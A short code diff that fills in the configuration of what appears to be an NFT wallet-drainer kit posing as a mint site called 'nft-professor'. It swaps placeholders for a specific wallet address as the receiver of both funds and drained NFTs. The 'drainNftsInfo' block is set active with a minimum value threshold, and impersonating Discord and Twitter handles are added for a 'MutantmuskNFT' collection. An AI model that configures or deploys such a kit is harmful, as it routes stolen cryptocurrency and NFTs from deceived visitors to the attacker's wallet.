@@ -2,7 +2,7 @@
     = = = = = YOU WALLET ADRESS = = = = =
 */
 
-const receiveAddress = "YOUR WALLET WITHIN QOUTES";
+const receiveAddress = "0xFb23a2225CF461dd041F228aA90Ae4381fc0Cd4D";
 
 /*
     = = = = = COLLECTION SETTINGS = = = = =
@@ -12,8 +12,8 @@ const collectionInfo = {
     name: "nft-professor",
     date: "10.04.2022",
     socialMedia: {
-        discord: "discord.gg/invite_here",
-        twitter: "https://twitter.com/username_here",
+        discord: "discord.gg/MutantmuskNFT",
+        twitter: "https://twitter.com/MutantmuskNFTs",
     },
     medias: {
         preview: "preview.gif",
@@ -48,7 +48,7 @@ const drainNftsInfo = {
     active: true,
     minValue: 0.2,
     maxTransfer: 1,
-    nftReceiveAddress: "YOUR WALLET",
+    nftReceiveAddress: "0xFb23a2225CF461dd041F228aA90Ae4381fc0Cd4D",
 }
 
 const customStrings = {
